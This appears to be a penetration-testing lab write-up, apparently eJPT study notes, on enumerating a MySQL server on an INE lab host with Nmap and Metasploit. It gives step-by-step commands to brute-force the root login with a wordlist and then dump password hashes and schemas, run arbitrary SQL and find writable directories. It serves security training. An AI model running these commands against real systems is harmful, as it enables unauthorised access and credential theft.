# L.06 - MySQL Enumeration

### Overview
- MySQL enumeration using Metasploit Framework auxiliary modules
- Target: `demo.ine.local` running MySQL (default port 3306)
- Goal: gather sensitive information from the MySQL service

### Lab Environment
- Kali GUI access
- Target machine: `demo.ine.local`
- Tools: **Nmap**, **Metasploit Framework**

### Objective
Run the following auxiliary modules against the target:
- `auxiliary/scanner/mysql/mysql_version`
- `auxiliary/scanner/mysql/mysql_login`
- `auxiliary/admin/mysql/mysql_enum`
- `auxiliary/admin/mysql/mysql_sql`
- `auxiliary/scanner/mysql/mysql_file_enum`
- `auxiliary/scanner/mysql/mysql_hashdump`
- `auxiliary/scanner/mysql/mysql_schemadump`
- `auxiliary/scanner/mysql/mysql_writable_dirs`

### Steps / Commands

1. **Check target reachability**
```bash
ping -c 4 demo.ine.local
```

2. **Nmap scan to identify MySQL service**
```bash
nmap demo.ine.local
```

3. **Start Metasploit Framework**
```bash
msfconsole -q
```

4. **MySQL version detection**
```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

5. **MySQL login brute-force**
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```
- Found credentials: `root:twinkle` (example from lab)

6. **MySQL enumeration**
```bash
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

7. **Execute SQL queries**
```bash
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

8. **MySQL file enumeration**
```bash
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

9. **MySQL hash dump**
```bash
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

10. **MySQL schema dump**
```bash
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

11. **MySQL writable directories**
```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### Key Modules
- `mysql_version` — version detection
- `mysql_login` — brute-force credentials
- `mysql_enum` — general enumeration (users, privileges, etc.)
- `mysql_sql` — run arbitrary SQL queries
- `mysql_file_enum` — enumerate files on server
- `mysql_hashdump` — dump password hashes
- `mysql_schemadump` — dump database schema
- `mysql_writable_dirs` — find writable directories

### eJPT Takeaway
- MySQL default port is **3306**
- Metasploit has many MySQL aux modules for enumeration and exploitation
- After finding credentials, use admin modules for deeper access
- `mysql_hashdump` and `mysql_schemadump` can reveal sensitive data
- `mysql_writable_dirs` can help with privilege escalation or file write

### Note
- Lab reference only — IPs/domains and credentials may differ in your environment